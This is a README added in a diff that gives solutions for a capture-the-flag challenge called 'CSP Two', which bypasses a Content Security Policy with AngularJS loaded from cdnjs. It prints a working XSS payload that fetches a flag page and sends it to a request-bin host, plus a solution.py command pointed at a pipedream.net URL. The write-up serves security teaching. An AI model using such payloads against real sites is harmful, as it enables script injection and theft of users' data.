@@ -1,0 +1,13 @@
+# CSP Two
+Similar to CSP-2 from last year. But.. with `cdnjs.cloudflare.com`. Bypass the CSP using **Angular JS and Prototype.js**. Based on [H5SC](https://html5sec.org/minichallenges/3). Possible solutions captured in [Cure53 Challenge Wiki](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22). 
+
+For this challenge there are multiple ways to solve it, I like hamayanhamayan's solution from [last year](https://www.hamayanhamayan.com/entry/2020/03/06/210852)
+```
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js"></script><p ng-app>{{constructor.constructor('fetch("/csp-two-flag").then(x=>x.text()).then(x=>location="https://<your-request-bin>/?q="+escape(x))')()}}
+```
+
+To generate a payload to read the flag, use solution.py: 
+```
+python solution.py [$REQUEST_BIN_URL]
+python solution.py http://endiel6lj35l8.x.pipedream.net
+```
